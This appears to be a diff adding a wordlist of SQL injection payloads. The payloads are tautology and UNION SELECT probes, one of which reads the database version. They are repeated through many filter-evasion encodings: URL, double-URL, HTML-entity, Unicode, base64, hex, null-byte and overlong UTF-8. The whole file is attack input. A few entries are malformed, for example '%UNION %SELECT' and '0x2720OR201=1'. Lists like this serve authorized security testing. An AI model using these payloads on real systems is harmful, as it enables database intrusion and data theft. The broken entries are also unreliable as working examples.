@@ -1,0 +1,61 @@
+%27 AND 1=1-- -
+%27 OR 1=1-- -
+%27 UNION SELECT 1-- -
+%2527 AND 1=1-- -
+%2527 OR 1=1-- -
+\x27 AND 1=1-- -
+' AND 1=1-- -
+&#039; AND 1=1-- -
+&apos; AND 1=1-- -
+%27%20AND%201%3D1--%20-
+%2527%20AND%201%3D1--%20-
+1%20AND%201=1
+1%20OR%201=1
+1%27%20UNION%20SELECT%201--%20-
+1%2527%20UNION%20SELECT%201--%20-
+char(39)+AND+1=1-- -
+char(0x27)+AND+1=1-- -
+0x31 AND 1=1-- -
+0x27 OR 1=1-- -
+concat(char(39),AND,char(39),1,char(39),'='1)
+1' %55NION %53ELECT 1-- -
+1' %UNION %SELECT 1-- -
+1' uNiOn SeLeCt 1-- -
+1' UniOn SeLeCt 1-- -
+1' UNION%0ASELECT 1-- -
+1' UNION%09SELECT 1-- -
+1' UNION%0DSELECT 1-- -
+1'%0AUNION%0ASELECT%0A1-- -
+1'%09UNION%09SELECT%091-- -
+1' %2BUNION%2BSELECT%2B1-- -
+# Additional encoding variants
+%27+OR+%271%27%3D%271-- -
+%27+UNION+ALL+SELECT+NULL--%20-
+%2527+UNION+ALL+SELECT+NULL--
+%27%20UNION%20SELECT%20NULL,@@version,NULL--%20-
+# HTML entity
+&#x27; OR 1=1-- -
+&#39; OR 1=1-- -
+&#0039; OR 1=1-- -
+# Unicode variants
+' OR 1=1-- -
+ʼ OR 1=1-- -
+' OR 1=1-- -
+# UTF-16 encoded quote
+%FF%FE27 OR 1=1-- -
+# Double encoding chains
+%25%32%37 OR 1=1-- -
+%25%32%37%20AND%201%3D1-- -
+# Base64 injection (for base64 decoded params)
+JyBPUiAxPTE=
+JyBVTklPTiBTRUxFQ1QgTlVMTA==
+# Hex string literals
+0x2720OR201=1-- -
+SELECT CHAR(39)+CHAR(79)+CHAR(82)+CHAR(32)+CHAR(49)+CHAR(61)+CHAR(49)-- -
+# NULL byte injection
+1'\x00 OR 1=1-- -
+1'%00 OR 1=1-- -
+1'\x00' OR '1'='1
+# Overlong UTF-8 sequence
+1%c0%af OR 1=1-- -
+1%e0%80%af OR 1=1-- -
